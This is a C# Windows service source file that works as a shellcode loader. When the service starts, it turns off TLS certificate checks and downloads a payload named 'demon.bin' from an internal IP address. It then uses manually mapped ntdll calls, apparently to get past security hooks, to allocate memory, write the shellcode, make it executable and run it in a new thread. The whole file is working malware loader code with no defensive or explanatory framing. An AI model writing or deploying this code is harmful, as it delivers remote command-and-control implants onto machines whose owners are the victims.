using System;
using System.Diagnostics;
using System.ServiceProcess;
using System.Net.Http;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Threading;
using DInvoke.DynamicInvoke;
using DInvoke.ManualMap;
using Data = DInvoke.Data;


namespace ServiceExec
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected async override void OnStart(string[] args)
        {
            Data.PE.PE_MANUAL_MAP _ntdllMap;
            IntPtr hNtdll = Generic.GetPebLdrModuleEntry("ntdll.dll");
            _ntdllMap = Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");

            var target = Process.GetCurrentProcess();

            /* Fetch Shellcode From Remote URL */

            byte[] shellcode = { };

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    try
                    {
                        shellcode = await client.GetByteArrayAsync("http://192.168.25.129:9090/demon.bin");
                    }
                    catch
                    {
                        Process.GetCurrentProcess().Kill();
                    }
                }
            }

            /* Allocate Virtual Memory */

            var baseAddress = IntPtr.Zero;
            var regionSize = (IntPtr)shellcode.Length;

            var parameters = new object[]
            {
                    target.Handle,
                    baseAddress,
                    IntPtr.Zero,
                    regionSize,
                    Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                    Win32.MemoryProtection.ExecuteReadWrite
            };

            var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                _ntdllMap.PEINFO,
                _ntdllMap.ModuleBase,
                "NtAllocateVirtualMemory",
                typeof(Win32.NtAllocateVirtualMemory),
                parameters,
                false);

            if (status == Data.Native.NTSTATUS.Success)
            {
                baseAddress = (IntPtr)parameters[1];
            }

            /* Copying Shellcode Into Memory */

            var buf = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buf, shellcode.Length);
            uint bytesWritten = 0;

            parameters = new object[]
            {
                    target.Handle,
                    baseAddress,
                    buf,
                    (uint)shellcode.Length,
                    bytesWritten
            };

            status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                _ntdllMap.PEINFO,
                _ntdllMap.ModuleBase,
                "NtWriteVirtualMemory",
                typeof(Win32.NtWriteVirtualMemory),
                parameters,
                false);

            /* Making Shellcode Executable (RX) */

            var oldProtection = (Win32.MemoryProtection)0;
            regionSize = (IntPtr)shellcode.Length;

            parameters = new object[]
            {
                    target.Handle,
                    baseAddress,
                    regionSize,
                    Win32.MemoryProtection.ExecuteRead,
                    oldProtection
            };

            status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                _ntdllMap.PEINFO,
                _ntdllMap.ModuleBase,
                "NtProtectVirtualMemory",
                typeof(Win32.NtProtectVirtualMemory),
                parameters,
                false);

            /* Start Thread In Process */

            IntPtr threadHandle = IntPtr.Zero;

            parameters = new object[]
            {
                    threadHandle,
                    (UInt32) 0x0000FFFF | 0x001F0000,
                    IntPtr.Zero,
                    target.Handle,
                    baseAddress,
                    IntPtr.Zero,
                    false,
                    0,
                    0,
                    0,
                    IntPtr.Zero
            };

            status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                _ntdllMap.PEINFO,
                _ntdllMap.ModuleBase,
                "NtCreateThreadEx",
                typeof(Win32.NtCreateThreadEx),
                parameters,
                false);

            if (status == Data.Native.NTSTATUS.Success)
            {
                threadHandle = (IntPtr)parameters[0];
            }

            /* Prevent Process Thread From Exiting (Self-Injection) */

            var fPtr = IntPtr.Zero;
            const uint INFINITE = 0xFFFFFFFF;
            fPtr = Generic.GetLibraryAddress("ntdll.dll", "NtWaitForSingleObject");
            Win32.NtWaitForSingleObject fnNtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(Win32.NtWaitForSingleObject)) as Win32.NtWaitForSingleObject;
            fnNtWaitForSingleObject(threadHandle, false, Win32.LARGE_INTEGER.FromInt64(INFINITE));
        }

        protected override void OnStop()
        {
        }
    }
}
